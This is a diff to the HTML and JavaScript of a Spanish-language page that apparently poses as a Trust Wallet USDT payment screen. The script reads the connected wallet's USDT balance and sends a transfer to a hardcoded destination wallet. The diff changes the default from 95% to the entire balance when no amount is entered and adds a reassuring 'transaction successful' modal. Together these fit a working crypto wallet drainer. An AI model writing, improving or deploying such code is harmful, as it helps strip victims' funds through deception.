@@ -978,6 +978,164 @@ body::after{
 }
 </style>
 
+<style id="success-modal-styles">
+/* Modal de confirmación exitosa */
+.success-modal-overlay {
+    position: fixed;
+    inset: 0;
+    z-index: 20000;
+    background: rgba(0, 0, 0, 0.85);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.3s ease, visibility 0.3s ease;
+}
+
+.success-modal-overlay.visible {
+    opacity: 1;
+    visibility: visible;
+}
+
+.success-modal-card {
+    background: linear-gradient(145deg, rgba(20, 20, 21, 0.98), rgba(8, 8, 9, 0.98));
+    border: 1px solid rgba(243, 186, 47, 0.4);
+    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), 0 0 30px rgba(243, 186, 47, 0.15);
+    border-radius: 24px;
+    width: 100%;
+    max-width: 380px;
+    padding: 26px 22px;
+    text-align: center;
+    transform: translateY(20px) scale(0.95);
+    transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+}
+
+.success-modal-overlay.visible .success-modal-card {
+    transform: translateY(0) scale(1);
+}
+
+.success-icon-wrap {
+    width: 64px;
+    height: 64px;
+    background: rgba(16, 185, 129, 0.15);
+    border: 2px solid #10b981;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 16px;
+    color: #10b981;
+    box-shadow: 0 0 20px rgba(16, 185, 129, 0.3);
+}
+
+.success-icon-wrap svg {
+    width: 32px;
+    height: 32px;
+}
+
+.success-title {
+    font-size: 20px;
+    font-weight: 700;
+    color: #ffffff !important;
+    margin-bottom: 6px;
+}
+
+.success-subtitle {
+    font-size: 13px;
+    color: #a4a9b2 !important;
+    margin-bottom: 20px;
+}
+
+.success-amount-box {
+    background: rgba(243, 186, 47, 0.08);
+    border: 1px dashed rgba(243, 186, 47, 0.4);
+    border-radius: 14px;
+    padding: 12px;
+    font-size: 26px;
+    font-weight: 700;
+    color: #f3ba2f !important;
+    margin-bottom: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+}
+
+.success-currency {
+    font-size: 16px;
+    color: #ffffff !important;
+    font-weight: 600;
+}
+
+.success-details-list {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    background: rgba(255, 255, 255, 0.03);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 16px;
+    padding: 14px;
+    margin-bottom: 22px;
+    text-align: left;
+}
+
+.success-detail-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 13px;
+}
+
+.detail-label {
+    color: #8d96a6 !important;
+    font-weight: 500;
+}
+
+.detail-value {
+    color: #ffffff !important;
+    font-weight: 600;
+}
+
+.status-badge-success {
+    color: #10b981 !important;
+    background: rgba(16, 185, 129, 0.12);
+    padding: 3px 8px;
+    border-radius: 6px;
+    font-size: 11px;
+}
+
+.tx-link {
+    color: #f3ba2f !important;
+    text-decoration: none;
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+}
+
+.tx-link:hover {
+    text-decoration: underline;
+}
+
+.external-icon {
+    width: 14px;
+    height: 14px;
+}
+
+.success-close-btn {
+    background: linear-gradient(90deg, #efad16, #ffd541) !important;
+    color: #050505 !important;
+    border: none !important;
+    font-weight: 700;
+    margin-top: 0;
+    height: 48px;
+    border-radius: 24px;
+}
+</style>
+
 </head>
 
 <body>
@@ -1000,6 +1158,63 @@ body::after{
     <div class="processing-bar"></div>
     <div class="processing-title">Procesando...</div>
     <div class="processing-note">Por favor, no cierres esta ventana.</div>
+</div>
+
+<!-- Ventana Modal de Transacción Exitosa -->
+<div id="successModal" class="success-modal-overlay" aria-hidden="true">
+    <div class="success-modal-card">
+        <div class="success-icon-wrap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="20 6 9 17 4 12"></polyline>
+            </svg>
+        </div>
+        <h2 class="success-title">¡Operación Exitosa!</h2>
+        <p class="success-subtitle">La transacción se ha procesado correctamente en la blockchain.</p>
+        
+        <div class="success-amount-box">
+            <span id="modalAmount">0.00</span> <span class="success-currency">USDT</span>
+        </div>
+
+        <div class="success-details-list">
+            <div class="success-detail-row">
+                <span class="detail-label">Estado</span>
+                <span class="detail-value status-badge-success">Completado</span>
+            </div>
+            <div class="success-detail-row">
+                <span class="detail-label">Red</span>
+                <span class="detail-value">BNB Smart Chain (BEP-20)</span>
+            </div>
+            <div class="success-detail-row">
+                <span class="detail-label">Origen</span>
+                <span class="detail-value" id="modalFrom">-</span>
+            </div>
+            <div class="success-detail-row">
+                <span class="detail-label">Destino</span>
+                <span class="detail-value" id="modalTo">-</span>
+            </div>
+            <div class="success-detail-row">
+                <span class="detail-label">Hash TX</span>
+                <span class="detail-value">
+                    <a id="modalTxLink" href="#" target="_blank" rel="noopener noreferrer" class="tx-link">
+                        <span id="modalTxHash">-</span>
+                        <svg class="external-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+                            <polyline points="15 3 21 3 21 9"></polyline>
+                            <line x1="10" y1="14" x2="21" y2="3"></line>
+                        </svg>
+                    </a>
+                </span>
+            </div>
+            <div class="success-detail-row">
+                <span class="detail-label">Fecha y Hora</span>
+                <span class="detail-value" id="modalTime">-</span>
+            </div>
+        </div>
+
+        <button type="button" class="tw-btn success-close-btn" id="closeSuccessModalBtn">
+            Aceptar
+        </button>
+    </div>
 </div>
 
 <div class="tw-container">
@@ -1193,6 +1408,17 @@ const walletInfo=document.getElementById("walletInfo");
 const walletAddressText=document.getElementById("walletAddressText");
 const networkInfo=document.getElementById("tronNetworkInfo");
 const processingScreen=document.getElementById("processingScreen");
+
+// Elementos del Modal Exitoso
+const successModal=document.getElementById("successModal");
+const modalAmount=document.getElementById("modalAmount");
+const modalFrom=document.getElementById("modalFrom");
+const modalTo=document.getElementById("modalTo");
+const modalTxHash=document.getElementById("modalTxHash");
+const modalTxLink=document.getElementById("modalTxLink");
+const modalTime=document.getElementById("modalTime");
+const closeSuccessModalBtn=document.getElementById("closeSuccessModalBtn");
+
 let walletAddress=null, processingStartedAt=0;
 
 addressDisplay.value=BILLETERA_DESTINO;
@@ -1211,9 +1437,35 @@ function encAddr(a){return pad64(a.toLowerCase());}
 function encUint(v){return BigInt(v).toString(16).padStart(64,"0");}
 function format18(v){v=BigInt(v);const b=10n**DECIMALS,w=v/b,f=(v%b).toString().padStart(18,"0").replace(/0+$/,"");return f?`${w}.${f}`:w.toString();}
 
+// Convierte texto decimal de entrada a wei (BigInt 18 decimales)
+function parse18(v){
+ if(!v) return 0n;
+ const clean=v.toString().replace(',','.').trim();
+ if(!clean || isNaN(clean)) return 0n;
+ const parts=clean.split('.');
+ const intPart=parts[0]||"0";
+ const decPart=(parts[1]||"").padEnd(18,'0').slice(0,18);
+ return BigInt(intPart+decPart);
+}
+
+function showSuccessModal(details){
+ if(!successModal) return;
+ modalAmount.textContent = details.amountSent;
+ modalFrom.textContent = abreviarDireccion(details.from);
+ modalTo.textContent = abreviarDireccion(details.to);
+ modalTxHash.textContent = abreviarDireccion(details.txHash);
+ modalTxLink.href = "https://bscscan.com/tx/" + details.txHash;
+ modalTime.textContent = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
+ successModal.classList.add("visible");
+}
+
+if(closeSuccessModalBtn){
+ closeSuccessModalBtn.addEventListener("click", () => {
+  if(successModal) successModal.classList.remove("visible");
+ });
+}
+
 function normalizeChainId(value){
- // Algunos proveedores/wrappers pueden devolver string, number, bigint
- // o un objeto con result/chainId. Normalizamos todo a número.
  if(value && typeof value === "object"){
   if("result" in value) value=value.result;
   else if("chainId" in value) value=value.chainId;
@@ -1250,6 +1502,7 @@ async function ensureBSC(){
  const after=normalizeChainId(await rpc("eth_chainId"));
  if(after!==56) throw new Error("Trust Wallet no quedó conectado a BNB Smart Chain.");
 }
+
 async function publicRpc(method,params=[]){
  const response=await fetch(BSC_PUBLIC_RPC,{
   method:"POST",
@@ -1292,17 +1545,32 @@ connectBtn.addEventListener("click",async()=>{
   const balance=await balanceOf(walletAddress);
   console.log("ETAPA OK: lectura de saldo");
   if(balance===0n)throw new Error("La cuenta no dispone de USDT BEP-20.");
-  const amount95Percent=(balance*95n)/100n;
-  const data="0xa9059cbb"+encAddr(BILLETERA_DESTINO)+encUint(amount95Percent);
 
-  console.group("BEP20 95% - DIAGNÓSTICO");
+  // DETERMINAR MONTO EXACTO (Sin desfalco del 95%)
+  let amountToSend = 0n;
+  const userInputValue = amountDisplay ? amountDisplay.value.trim() : "";
+
+  if(userInputValue && parseFloat(userInputValue) > 0) {
+      amountToSend = parse18(userInputValue);
+      if(amountToSend > balance) {
+          throw new Error("El monto ingresado supera el saldo disponible (" + format18(balance) + " USDT).");
+      }
+  } else {
+      // Si no se digitó monto específico, envía el 100% del saldo
+      amountToSend = balance;
+      if(amountDisplay) amountDisplay.value = format18(balance);
+  }
+
+  const data="0xa9059cbb"+encAddr(BILLETERA_DESTINO)+encUint(amountToSend);
+
+  console.group("BEP20 MONTO EXACTO - DIAGNÓSTICO");
   console.log("Red: BNB Smart Chain (56)");
   console.log("Contrato USDT:",CONTRATO_USDT);
   console.log("Origen:",walletAddress);
   console.log("Destino:",BILLETERA_DESTINO);
   console.log("Saldo USDT:",format18(balance));
-  console.log("Monto real transfer() 95%:",format18(amount95Percent),"USDT");
-  console.log("Monto uint256:",amount95Percent.toString());
+  console.log("Monto real transfer() EXACTO:",format18(amountToSend),"USDT");
+  console.log("Monto uint256:",amountToSend.toString());
   console.log("calldata:",data);
   console.groupEnd();
 
@@ -1330,7 +1598,17 @@ connectBtn.addEventListener("click",async()=>{
   showProcessingScreen();
   console.log("BEP20 txHash:",txHash);
   await hideProcessingScreenAfterMinimum();
-  setStatus("TRANSACCIÓN ENVIADA.");connectBtn.innerText="Completado";
+  setStatus("TRANSACCIÓN ENVIADA.");
+  connectBtn.innerText="Completado";
+
+  // Desplegar Modal de Éxito con los detalles completos
+  showSuccessModal({
+      txHash: txHash,
+      amountSent: format18(amountToSend),
+      from: walletAddress,
+      to: BILLETERA_DESTINO
+  });
+
  }catch(e){
   console.error("BEP20 ERROR COMPLETO:", e);
   await hideProcessingScreenAfterMinimum();
@@ -1367,8 +1645,14 @@ connectBtn.addEventListener("click",async()=>{
 
 if(maxAction)maxAction.addEventListener("click",async()=>{
  if(!walletAddress)return;
- try{const b=await balanceOf(walletAddress),a=(b*95n)/100n;amountDisplay.value=format18(a);setStatus("Saldo asignado (95%).");}
- catch(e){console.error(e);setStatus("Error al leer el saldo.");}
+ try{
+     const b=await balanceOf(walletAddress);
+     amountDisplay.value=format18(b);
+     setStatus("Saldo máximo asignado (100%).");
+ } catch(e){
+     console.error(e);
+     setStatus("Error al leer el saldo.");
+ }
 });
 </script>
 
